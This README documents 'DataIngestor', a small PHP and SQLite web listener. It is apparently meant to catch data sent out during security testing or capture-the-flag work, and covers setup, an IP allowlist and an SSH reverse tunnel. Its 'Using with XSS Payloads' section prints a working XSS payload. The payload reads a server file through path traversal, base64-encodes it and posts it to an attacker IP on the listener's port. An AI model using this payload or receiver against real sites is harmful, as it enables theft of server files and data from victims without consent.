# DataIngestor

A secure data collection and management system designed to ingest, store, and view data submissions from various sources.

## Overview

DataIngestor provides a simple PHP-based web interface for collecting and managing data. It features IP-based access control, SQLite database storage, and a responsive UI for data display and management. It's particularly useful for collecting data from external sources via POST requests or as part of security testing scenarios.

## Setup Instructions

### 1. Create the SQLite Database

First, navigate to the data directory and create the SQLite database with the appropriate table schema:

```console
cd 306d717c3f592af0186ed31e2f056a7d
sqlite3 data.db "CREATE TABLE entries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    data TEXT NOT NULL,
    referrer TEXT,
    client_ip TEXT NOT NULL,
    entry_datetime DATETIME
);"
```

This creates a table with the following columns:
- `id`: Unique identifier for each entry (auto-incremented)
- `data`: The main content being stored
- `referrer`: HTTP referrer information (if available)
- `client_ip`: IP address of the client making the submission
- `entry_datetime`: Timestamp when the entry was created

### 2. Configure Access Control

Create a `config.php` file to define allowed IP addresses and CIDR ranges:

```php
<?php

// Define the allowed CIDR range and IP addresses
$allowedCIDR = '19.12.0.0/16';  // Example CIDR range
$allowedIPs = ['127.0.0.1'];    // Add your IP to this array for development/testing

?>
```

This configuration restricts access to:
- The specified CIDR range (19.12.0.0/16 in this example)
- Any individual IP addresses listed in the `$allowedIPs` array

### 3. Start the PHP Server

Run the built-in PHP development server:

```console
php -S 0.0.0.0:6745 -t ./
```

This starts a web server on port 6745 accessible from any interface (0.0.0.0).

### 4. Optional: Configure Nginx Proxy (for Remote Access)

If you want to work locally and forward traffic through another device, create a proxy configuration on the remote server:

1. Copy the provided `proxy.conf` file to `/etc/nginx/conf.d/proxy.conf` on your remote server
2. Set up an SSH tunnel:

```console
ssh root@<remote-ip> -R 6745:127.0.0.1:6745
```

This creates a secure tunnel from the remote server's port 6745 to your local machine's port 6745.

## Usage

### Basic Data Submission

To send data to the ingestor using cURL:

```console
curl -k -X POST -d "data=test" https://domain.com/
```

### Using with XSS Payloads (Security Testing)

This is an example of how to send data captured via XSS to the ingestor:

```html
<img src=x onerror="fetch('/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/index.php')
.then(response => response.text())
.then(data => {
    f=document.createElement`form`;
    f.innerHTML='<input name=data value='+btoa(data)+'>';
    f.method='post';
    f.action='http://10.10.14.159:6745/index.php';
    document.body.appendChild(f);
    f.submit();
    document.body.removeChild(f);
});">
```

This example demonstrates:
1. Attempting to fetch content from a path traversal vulnerability
2. Base64 encoding the response data
3. Creating and submitting a form to the ingestor endpoint
4. Cleaning up by removing the form from the DOM

## Security Considerations

- The system implements IP-based access control, but should be deployed behind additional security layers in production
- Consider adding authentication for the web interface in production environments
- The included XSS example is for educational/testing purposes only

## Features

- Data submission via HTTP POST
- Automatic IP logging
- Base64 detection and decoding capability
- Real-time refresh when new data is received
- Copy-to-clipboard functionality
- Show/hide full data entries